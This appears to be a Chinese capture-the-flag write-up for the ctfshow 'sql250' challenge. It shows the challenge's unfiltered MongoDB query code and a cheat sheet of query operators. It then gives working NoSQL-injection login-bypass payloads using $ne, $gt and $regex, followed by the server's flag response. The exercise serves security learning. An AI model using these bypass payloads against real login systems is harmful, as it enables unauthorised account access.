# ctfshow-sql250



##### 参考链接

其他大佬链接

feng  https://blog.csdn.net/rfrder/article/details/113759746

Je3    https://blog.csdn.net/jvkyvly/article/details/115458909

Y4	 https://blog.csdn.net/solitudi/article/details/110144623

郁离歌大佬 https://blog.csdn.net/like98k/article/details/79436463

sql常见方法及udf提权   https://blog.csdn.net/qq_43645782/article/details/105468416

bit  https://www.xl-bit.cn/index.php/archives/93/





 查询语句 

```
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();
```



 返回逻辑 

```
  //无过滤
  if(count($cursor)>0){
    $ret['msg']='登陆成功';
    array_push($ret['data'], $flag);
  }
      

```



```sql
补充一下nosql注入笔记
http://rui0.cn/archives/609
https://www.anquanke.com/post/id/97211





$gt : >
$lt : <
$gte: >=
$lte: <=
$ne : !=、<>
$in : in
$nin: not in
$all: all 
$or:or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
/**
* : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
* : $ne { "age" : { "$ne" : 23}}
* : $lt { "age" : { "$lt" : 23}}
*/


//查询age = 22的记录
db.userInfo.find({"age": 22});
//相当于：select * from userInfo where age = 22;
//查询age > 22的记录
db.userInfo.find({age: {$gt: 22}});
//相当于：select * from userInfo where age > 22;



无过滤，利用$ne就可以了（post传进去）就可拿到flag
username[$ne]=1&password[$ne]=1
username[$gt]=1&password[$gt]=1
或者正则也行：
username[$regex]=.*&password[$regex]=.*


{"code":0,"msg":"\u767b\u9646\u6210\u529f ctfshow{b4f8450b-889d-41a9-b019-3e6117723691}","count":1,"data":["ctfshow{b4f8450b-889d-41a9-b019-3e6117723691}"]}



```



























